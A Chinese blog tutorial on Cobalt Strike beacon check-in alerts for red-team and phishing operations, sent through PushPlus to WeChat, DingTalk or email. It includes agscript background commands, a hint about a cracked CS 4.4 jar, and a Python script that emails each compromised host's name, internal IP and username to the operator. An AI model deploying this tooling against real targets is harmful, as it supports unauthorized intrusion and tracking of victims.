## 背景介绍

在实际攻防场景中，尤其是钓鱼中，我们不太可能一直保证CS在线，尤其是当网络存在波动，或者频繁的切换时。这时候就需要使用CS上线提醒。

现在正常使用的话，其实提醒无非分为三类。

![1653641546_6290914a6b3a15aebefc3.png!small](https://image.3001.net/images/20220527/1653641546_6290914a6b3a15aebefc3.png!small)

### 微信提醒

以前大部分都是使用server酱进行微信推送，但是现在server酱免费版每日只能提醒5次，其余的都需要收费，而且单次信息中间要间隔1分钟。

所以在这使用的是pushplus，目前Pushplus的日发送频率最大额为200次，基本满足日常攻防使用。

![1653641551_6290914fd3b64fe52a6be.png!small](https://image.3001.net/images/20220527/1653641551_6290914fd3b64fe52a6be.png!small)

#### 微信单人提醒

打开http://www.pushplus.plus/push1.html，微信扫码关注登陆，会随机生成一个Token。

![1653641556_62909154ae1bb9e416a13.png!small](https://image.3001.net/images/20220527/1653641556_62909154ae1bb9e416a13.png!small)

打开https://github.com/lintstar/CS-PushPlus里下载两个文件：PushPlus.cna和PushPlus.py。

在PushPlus.py中将你刚刚的token进行替换：

![1653641561_62909159379a8240c856e.png!small](https://image.3001.net/images/20220527/1653641561_62909159379a8240c856e.png!small)

配置PushPlus.cna文件

![1653641565_6290915df0a78bb199cae.png!small](https://image.3001.net/images/20220527/1653641565_6290915df0a78bb199cae.png!small)

需要注意的是，其中cmd中要使用绝对路径

其中title以及content内容可自由定制。

修改完成后，本地python3进行测试，  
![1653641570_6290916283a8bcbcd4f3f.png!small](https://image.3001.net/images/20220527/1653641570_6290916283a8bcbcd4f3f.png!small)  
收到提示后，上传至服务器后台运行  
`sudo ./agscript xx.xx.xx.xx 端口 xx 密码 ./PushPlus.cna > PushPlus.log 2>&1`

#### 微信多人提醒

访问http://www.pushplus.plus/push2.html保存自己的token,然后创建新的群组

![1653641575_629091671a362b70fcd8d.png!small](https://image.3001.net/images/20220527/1653641575_629091671a362b70fcd8d.png!small)

在这里需要记住群组编号，按照Pushplus的官方文档，单人提醒与多人提醒增加了一个"topic"参数。这里需要配置的信息如下："topic":"HW"

![1653641579_6290916b9ee61a7584a14.png!small](https://image.3001.net/images/20220527/1653641579_6290916b9ee61a7584a14.png!small)

配置完成后，需要点击查看二维码进行订阅进入群组，包括创建人也是要扫码才能够进入群组的。  
扫码完成后就会看到自己设置的提示消息。

![1653641586_62909172a76d2b43f2365.png!small](https://image.3001.net/images/20220527/1653641586_62909172a76d2b43f2365.png!small)

同样在配置完成后，在本地进行测试，可正常收到信息后，移动到服务器上进行执行

#### 问题

在实际部署过程中，可能存在部分问题。

    
    
    如果提示hostname问题
    则修改/etc/hosts 
    在127.0.0.1 localhost 后面加上主机名称(hostname) 即可:
    127.0.0.1 localhost XXX
    
    
    提示java问题，然后cs中只能看到用户退出，但是无法看到用户进入，所以消息不会被推送。
    
    解决办法：
    注释/etc/java-8-openjdk/accessibility.properties第一行内容

另外在后台运行时，可能会提示CSAgent.jar问题

![1653641592_6290917866ae66aa7f7db.png!small](https://image.3001.net/images/20220527/1653641592_6290917866ae66aa7f7db.png!small)

拿cs4.4举例，默认agscript中认证.jar是CSAgent.jar,而4.4中实际为hook，需要将agscript中的CSAgent.jar替换为hook.jar，其他版本只要换成相同的认证jar即可。

### 钉钉上线提醒

钉钉群和上述的方法基本相同，首先需要在钉钉中拉群一个群聊，并添加一个机器人：

![1653641597_6290917d27e3e7aa2c70c.png!small](https://image.3001.net/images/20220527/1653641597_6290917d27e3e7aa2c70c.png!small)

设置自定义

![1653641601_62909181cd9fef0db6b3c.png!small](https://image.3001.net/images/20220527/1653641601_62909181cd9fef0db6b3c.png!small)

选择添加即可获得一个Webhook地址

在公众号中个人设置-渠道配置

将钉钉机器人的webhook进行填写

![1653641606_629091869cbdac75f9ee4.png!small](https://image.3001.net/images/20220527/1653641606_629091869cbdac75f9ee4.png!small)

确认之后，在脚本里面进行修改："channel":"webhook", "webhook":"xxxx"

本地测试后即可服务器进行挂载。

### 邮件提醒

在Pushplus中，还提供了邮件提醒，配置的步骤上来讲，比较简单，在Pushplus中选择个人资料，绑定自己的邮箱：

![1653641613_6290918d3eec24299daf3.png!small](https://image.3001.net/images/20220527/1653641613_6290918d3eec24299daf3.png!small)

确认后会发送确认邮件

![1653641617_62909191c930e6374452e.png!small](https://image.3001.net/images/20220527/1653641617_62909191c930e6374452e.png!small)

![1653641622_629091967bae1ce940e55.png!small](https://image.3001.net/images/20220527/1653641622_629091967bae1ce940e55.png!small)

然后在原来的代码上进行修改：只需修改"channel":"mail"即可。

### 注意事项

在使用Pushplus推送的流程中，还有一个比较重要的问题：如果短时间内有多个相同主机上线，Pushplus会默认不发送重复数据内容，而且对发送频率也有要求

在实际过程中，几乎很少会出现同一时间多个相同目标同时上线，如果存在这种情况，可在代码中加入时间戳进行判断。

![1653641627_6290919b51fa73d175775.png!small](https://image.3001.net/images/20220527/1653641627_6290919b51fa73d175775.png!small)

### 隐蔽邮件提醒

使用第三方推送可能出现的问题就是信息泄露，这里也可以使用crow师傅写的脚本进行邮件提醒。

    
    
    # -*- encoding: utf-8 -*-    # Time : 2021/12/21 21:07:19
    # Author: crow
    
    import argparse
    import requests
    import random
    import string
    import json
    import time
    import smtplib
    from email.mime.text import MIMEText
    from email.header import Header
    
    
    parser = argparse.ArgumentParser(description='Beacon Info')
    parser.add_argument('--computername')
    parser.add_argument('--internalip')
    parser.add_argument('--username')
    args = parser.parse_args()
    
    internalip = args.internalip
    computername = args.computername
    username = args.username
    ran_str = ''.join(random.sample(string.ascii_letters + string.digits, 8))
    t_time = time.ctime()
    
    content = """
    
    您有霉国-2新主机上线啦
    
    主机名: {}
    IP: {}
    用户名: {}
    Token: {}
    上线时间：{}
    请注意查收哦~
    """.format(internalip, computername, username, ran_str, t_time)
    
    
    
    #1. 发送文本文件
    
    sender = '123876@qq.com' #发件人邮箱
    receiver = '1237@qq.com' #收件人邮箱
    mail_pass = 'cwxdebc' #qq邮箱授权码
    
    #text为邮件正文内容，plain为文本格式，'utf-8'为编码格式
    # text = '您有新主机上线。。。'
    # content
    message = MIMEText(content, 'plain', 'utf-8')
    
    #添加Header信息，From，To，Subject分别为发送者信息，接收者消息和邮件主题
    message['From'] = Header(sender, 'utf-8')
    message['To'] = Header(receiver, 'utf-8')
    
    subject = 'Cobalt Strike上线提醒'
    message['Subject'] = Header(subject, 'utf-8')
    
    
    try:
        #smtp.xxx.com为邮箱服务类型，25为STMP的端口
        smtpObj = smtplib.SMTP('smtp.qq.com', 25)#smtp.xxx.com为邮箱服务类型，25为STMP
        #smtpObj = smtplib.SMTP_SSL('smtp.xxx.com', 'xxx邮件服务的端口号')     
    
        smtpObj.login(sender, mail_pass)#登录
        smtpObj.sendmail(sender, receiver, message.as_string())#发送
        print ("邮件发送成功")
    except smtplib.SMTPException as e:
        print(e)
        print ("Error: 邮件发送失败")

然后修改一个CNA文件，同样服务器后台运行即可。

### 参考资料

<https://xz.aliyun.com/t/10698>

